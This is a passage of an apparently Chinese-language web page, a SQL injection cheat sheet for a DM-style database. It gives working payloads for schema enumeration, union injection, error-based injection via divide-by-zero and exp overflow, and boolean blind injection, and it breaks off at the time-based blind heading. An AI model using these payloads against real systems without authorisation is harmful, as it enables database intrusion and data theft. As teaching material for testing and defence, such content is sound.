+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>查询全部数据库的用户名</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="n">USERNAME</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">SYS</span><span class="p">.</span><span class="n">ALL_USERS</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="2-查询库名" class="heading-element"><span>2） 查询库名</span>
+  <a href="#2-%e6%9f%a5%e8%af%a2%e5%ba%93%e5%90%8d" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>查询全部库名，其中 OWNER 是步骤1）对应的数据库用户名。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="n">OBJECT_NAME</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">SYS</span><span class="p">.</span><span class="n">ALL_OBJECTS</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">OWNER</span><span class="o">=</span><span class="s1">&#39;SYSDBA&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">OBJECT_TYPE</span><span class="o">=</span><span class="s1">&#39;SCH&#39;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="3-查询表名" class="heading-element"><span>3） 查询表名</span>
+  <a href="#3-%e6%9f%a5%e8%af%a2%e8%a1%a8%e5%90%8d" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>查询全部表名， OWNER 是步骤2）对应的库名。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="n">OBJECT_NAME</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">SYS</span><span class="p">.</span><span class="n">ALL_OBJECTS</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">OWNER</span><span class="o">=</span><span class="s1">&#39;OTHER&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">OBJECT_TYPE</span><span class="o">=</span><span class="s1">&#39;TABLE&#39;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="4-查询列名" class="heading-element"><span>4） 查询列名</span>
+  <a href="#4-%e6%9f%a5%e8%af%a2%e5%88%97%e5%90%8d" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>可以使用下面的方式返回指定条件对应的列名，其中SCHEMA_NAME代表库名，TABLE_NAME代表表名。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="k">OWNER</span><span class="p">,</span><span class="k">TABLE_NAME</span><span class="p">,</span><span class="k">SCHEMA_NAME</span><span class="p">,</span><span class="k">COLUMN_NAME</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">SYS</span><span class="p">.</span><span class="n">ALL_COL_COMMENTS</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">SCHEMA_NAME</span><span class="o">=</span><span class="s1">&#39;OTHER&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">TABLE_NAME</span><span class="o">=</span><span class="s1">&#39;xxxxxx&#39;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="0x05-联合查询注入" class="heading-element"><span>0x05 联合查询注入</span>
+  <a href="#0x05-%e8%81%94%e5%90%88%e6%9f%a5%e8%af%a2%e6%b3%a8%e5%85%a5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>Union 注入与常规的没什么区别</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">num</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">...</span><span class="w">			</span><span class="c1">-- 注意列数和类型要相同</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="0x06-报错注入" class="heading-element"><span>0x06 报错注入</span>
+  <a href="#0x06-%e6%8a%a5%e9%94%99%e6%b3%a8%e5%85%a5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>常规的报错函数都不太行，无法直接获取结果。主要利用的是 除0错误、溢出错误，结合布尔注入进行。</p>
+<h3 id="61-除0错误" class="heading-element"><span>6.1 除0错误</span>
+  <a href="#61-%e9%99%a40%e9%94%99%e8%af%af" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">dual</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="o">/</span><span class="mi">0</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>结合布尔注入进行探测</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w">  </span><span class="k">FROM</span><span class="w"> </span><span class="n">t1</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">rownum</span><span class="o">&lt;</span><span class="mi">5</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="o">/</span><span class="k">if</span><span class="p">(</span><span class="n">len</span><span class="p">(</span><span class="k">user</span><span class="p">)</span><span class="o">=</span><span class="mi">6</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="k">DESC</span><span class="p">;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="62-溢出错误" class="heading-element"><span>6.2 溢出错误</span>
+  <a href="#62-%e6%ba%a2%e5%87%ba%e9%94%99%e8%af%af" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="n">exp</span><span class="p">(</span><span class="mi">710</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="n">exp</span><span class="p">(</span><span class="k">if</span><span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span><span class="mi">710</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="w">			</span><span class="c1">-- 数据溢出
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">select</span><span class="w"> </span><span class="n">exp</span><span class="p">(</span><span class="k">if</span><span class="p">(</span><span class="n">len</span><span class="p">(</span><span class="k">user</span><span class="p">)</span><span class="o">=</span><span class="mi">6</span><span class="p">,</span><span class="mi">710</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w">  </span><span class="k">FROM</span><span class="w"> </span><span class="n">t1</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">rownum</span><span class="o">&lt;</span><span class="mi">5</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="n">exp</span><span class="p">(</span><span class="k">if</span><span class="p">(</span><span class="n">len</span><span class="p">(</span><span class="k">user</span><span class="p">)</span><span class="o">=</span><span class="mi">6</span><span class="p">,</span><span class="mi">710</span><span class="p">,</span><span class="mi">0</span><span class="p">))</span><span class="w"> </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="k">DESC</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w">  </span><span class="k">FROM</span><span class="w"> </span><span class="n">t1</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">rownum</span><span class="o">&lt;</span><span class="mi">5</span><span class="w"> </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">id</span><span class="p">,</span><span class="n">exp</span><span class="p">(</span><span class="k">if</span><span class="p">(</span><span class="n">len</span><span class="p">(</span><span class="k">user</span><span class="p">)</span><span class="o">=</span><span class="mi">6</span><span class="p">,</span><span class="mi">711</span><span class="p">,</span><span class="mi">0</span><span class="p">))</span><span class="w"> </span><span class="k">DESC</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w">  </span><span class="k">FROM</span><span class="w"> </span><span class="n">t1</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">rownum</span><span class="o">&lt;</span><span class="mi">5</span><span class="w"> </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="k">DESC</span><span class="p">,</span><span class="w"> </span><span class="n">exp</span><span class="p">(</span><span class="k">if</span><span class="p">(</span><span class="n">len</span><span class="p">(</span><span class="k">user</span><span class="p">)</span><span class="o">=</span><span class="mi">6</span><span class="p">,</span><span class="mi">710</span><span class="p">,</span><span class="mi">0</span><span class="p">));</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="0x07-布尔盲注" class="heading-element"><span>0x07 布尔盲注</span>
+  <a href="#0x07-%e5%b8%83%e5%b0%94%e7%9b%b2%e6%b3%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>布尔盲注语法</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="n">expr</span><span class="err">，参数</span><span class="mi">1</span><span class="err">，参数</span><span class="mi">2</span><span class="p">)</span><span class="w"> </span><span class="c1">-- expr成立时，返回参数1的值;不成立时，返回参数2的值
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">CASE</span><span class="w"> </span><span class="k">WHEN</span><span class="w"> </span><span class="n">exp</span><span class="w"> </span><span class="k">THEN</span><span class="w"> </span><span class="n">state1</span><span class="w"> </span><span class="k">ELSE</span><span class="w"> </span><span class="n">state2</span><span class="w"> </span><span class="k">END</span><span class="w">		</span><span class="c1">-- 同IF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">DECODE</span><span class="p">(</span><span class="n">expr</span><span class="p">,</span><span class="w"> </span><span class="n">search1</span><span class="p">,</span><span class="w"> </span><span class="n">result1</span><span class="w"> </span><span class="p">[,</span><span class="w"> </span><span class="n">search2</span><span class="p">,</span><span class="w"> </span><span class="n">result2</span><span class="p">,...][,</span><span class="w"> </span><span class="n">default_result</span><span class="p">])</span><span class="w">  </span><span class="c1">-- 类似 switch case, 如果 expr=search1，则返回 result1，否则返回default_result
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">IFNULL</span><span class="p">(</span><span class="n">expr1</span><span class="p">,</span><span class="n">expr2</span><span class="p">)</span><span class="w">					</span><span class="c1">-- 如果 expr1 不为 NULL，则返回 expr1，否则返回 expr2
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">NULLIF</span><span class="p">(</span><span class="n">expr1</span><span class="p">,</span><span class="n">expr2</span><span class="p">)</span><span class="w">					</span><span class="c1">-- 若expr1与expr2不同，则返回expr1，否则返回NULL
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">if</span><span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="s1">&#39;123456&#39;</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">)),</span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w">		</span><span class="c1">-- 综合使用，盲注必备
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">CASE</span><span class="w"> </span><span class="k">WHEN</span><span class="w"> </span><span class="n">len</span><span class="p">(</span><span class="k">user</span><span class="p">)</span><span class="o">=</span><span class="mi">6</span><span class="w"> </span><span class="k">THEN</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">ELSE</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="k">END</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">DECODE</span><span class="p">(</span><span class="n">len</span><span class="p">(</span><span class="k">user</span><span class="p">),</span><span class="mi">6</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span><span class="w">							</span><span class="c1">-- 判断len(user)=6是否成立，成立返回1，否则返回0</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>案例：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w">  </span><span class="k">FROM</span><span class="w"> </span><span class="n">t1</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">rownum</span><span class="o">&lt;</span><span class="mi">5</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="k">if</span><span class="p">(</span><span class="n">len</span><span class="p">(</span><span class="k">user</span><span class="p">)</span><span class="o">=</span><span class="mi">6</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="k">DESC</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w">  </span><span class="k">FROM</span><span class="w"> </span><span class="n">t1</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">rownum</span><span class="o">&lt;</span><span class="mi">5</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="p">(</span><span class="k">case</span><span class="w"> </span><span class="k">when</span><span class="w"> </span><span class="n">len</span><span class="p">(</span><span class="k">user</span><span class="p">)</span><span class="o">=</span><span class="mi">4</span><span class="w"> </span><span class="k">then</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="k">end</span><span class="p">)</span><span class="w"> </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="k">DESC</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w">  </span><span class="k">FROM</span><span class="w"> </span><span class="n">t1</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">rownum</span><span class="o">&lt;</span><span class="mi">5</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="n">decode</span><span class="p">(</span><span class="n">len</span><span class="p">(</span><span class="k">user</span><span class="p">),</span><span class="mi">6</span><span class="w"> </span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="k">DESC</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w">  </span><span class="k">FROM</span><span class="w"> </span><span class="n">t1</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">rownum</span><span class="o">&lt;</span><span class="mi">5</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="n">IFNULL</span><span class="p">(</span><span class="n">len</span><span class="p">(</span><span class="k">user</span><span class="p">)</span><span class="o">=</span><span class="mi">6</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="k">DESC</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w">  </span><span class="k">FROM</span><span class="w"> </span><span class="n">t1</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">rownum</span><span class="o">&lt;</span><span class="mi">5</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="k">NULLIF</span><span class="p">(</span><span class="n">len</span><span class="p">(</span><span class="k">user</span><span class="p">)</span><span class="o">=</span><span class="mi">6</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="k">DESC</span><span class="p">;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="0x08-时间盲注" class="heading-element"><span>0x08 时间盲注</span>
+  <a href="#0x08-%e6%97%b6%e9%97%b4%e7%9b%b2%e6%b3%a8" class="heading-mark">
